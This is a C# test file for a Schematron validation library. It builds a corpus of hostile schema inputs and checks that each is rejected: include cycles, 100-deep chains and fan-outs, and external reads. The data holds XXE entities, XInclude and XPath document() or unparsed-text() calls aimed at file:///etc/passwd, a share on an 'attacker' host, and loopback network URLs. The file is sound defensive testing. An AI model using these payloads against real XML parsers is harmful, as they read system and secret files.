namespace NetEvolve.Schemas.Schematron.Tests.Integration.Hostile;

using NetEvolve.Schemas.Schematron;
using NetEvolve.Schemas.Xml.Contracts;

/// <summary>The cases of the load stage: include cycles and chains, XInclude, and every attempt to reach a document outside the map.</summary>
internal static partial class HostileCorpus
{
    private static IEnumerable<HostileCase> Includes()
    {
        const string Include = "<include href=\"{0}\"/>";

        yield return Make(
            "include-cycle",
            Schema(string.Format(null, Include, "a.sch")),
            One,
            SchematronDiagnosticCodes.IncludeCycle.Number,
            Files(
                "include-cycle",
                ("a.sch", Library(string.Format(null, Include, "b.sch"))),
                ("b.sch", Library(string.Format(null, Include, "a.sch")))
            )
        );
        yield return Make(
            "include-self",
            Schema(string.Format(null, Include, "schema.sch")),
            One,
            SchematronDiagnosticCodes.IncludeCycle.Number,
            Files("include-self", ("schema.sch", Schema(string.Format(null, Include, "schema.sch"))))
        );

        // A chain of 100 libraries and a fan-out of 100 includes both pass the default resolver but exceed the 16 external resources.
        var chain = Enumerable
            .Range(0, 100)
            .Select(static i => ($"m{i}.sch", Library(string.Format(null, "<include href=\"m{0}.sch\"/>", i + 1))))
            .Append(("m100.sch", Library(string.Empty)))
            .ToArray();
        yield return Make(
            "include-chain",
            Schema(string.Format(null, Include, "m0.sch")),
            One,
            ExternalLimit,
            Files("include-chain", chain)
        );

        var fan = Enumerable.Range(0, 100).Select(static i => ($"m{i}.sch", Library(string.Empty))).ToArray();
        yield return Make(
            "include-fan-out",
            Schema(string.Concat(fan.Select(static f => string.Format(null, Include, f.Item1)))),
            One,
            ExternalLimit,
            Files("include-fan-out", fan)
        );

        const string Xi = "<xi:include href=\"{0}\"/>";
        yield return Make(
            "xinclude-cycle",
            Schema(string.Format(null, Xi, "a.xml")),
            One,
            SchematronDiagnosticCodes.IncludeCycle.Number,
            Files(
                "xinclude-cycle",
                ("a.xml", Library(string.Format(null, Xi, "b.xml"))),
                ("b.xml", Library(string.Format(null, Xi, "a.xml")))
            )
        );

        var deep = Enumerable
            .Range(0, 300)
            .Select(static i => ($"x{i}.xml", Library(string.Format(null, "<xi:include href=\"x{0}.xml\"/>", i + 1))))
            .ToArray();
        yield return Make(
            "xinclude-chain",
            Schema(string.Format(null, Xi, "x0.xml")),
            One,
            CoreDiagnosticCodes.DepthLimitExceeded.Number,
            Files("xinclude-chain", deep),
            ValidationLimits.Default.WithMaxExternalResources(1_000)
        );
    }

    private static IEnumerable<HostileCase> External()
    {
        foreach (
            var (id, body) in new (string, string)[]
            {
                ("external-include-file", "<include href=\"file:///etc/passwd\"/>"),
                ("external-include-network", "<include href=\"http://127.0.0.1:9/rules.sch\"/>"),
                ("external-include-unc", "<include href=\"file://attacker/share/rules.sch\"/>"),
                ("external-xinclude-file", "<xi:include href=\"file:///etc/passwd\" parse=\"text\"/>"),
                ("external-xinclude-network", "<xi:include href=\"http://127.0.0.1:9/rules.xml\"/>"),
                ("external-xslt-import", "<xsl:import href=\"file:///secret/lib.xsl\"/>" + Rule("true()")),
                ("external-xslt-include", "<xsl:include href=\"http://127.0.0.1:9/lib.xsl\"/>" + Rule("true()")),
            }
        )
        {
            yield return Make(id, Schema(body), One, Denied, external: true);
        }

        foreach (
            var (id, test) in new (string, string)[]
            {
                ("external-document-file", "document('file:///secret/data.xml')"),
                ("external-document-network", "document('http://127.0.0.1:9/data.xml')"),
                ("external-doc-file", "doc('file:///secret/data.xml')"),
                ("external-unparsed-text-file", "unparsed-text('file:///etc/passwd')"),
            }
        )
        {
            yield return Make(
                id,
                Schema(Rule("exists(" + test + ")")),
                One,
                SchematronDiagnosticCodes.EvaluationFailed.Number,
                external: true
            );
        }

        yield return Make(
            "external-dtd-schema",
            "<!DOCTYPE schema [<!ENTITY x SYSTEM \"file:///etc/passwd\">]>" + Schema("<p>&x;</p>" + Rule("true()")),
            One,
            XmlErrorCodes.XML2001.Code.Number,
            external: true
        );
        yield return Make(
            "external-dtd-instance",
            Schema(Rule("true()")),
            "<!DOCTYPE a [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><a>&x;</a>",
            XmlErrorCodes.XML2001.Code.Number,
            external: true
        );
    }
}
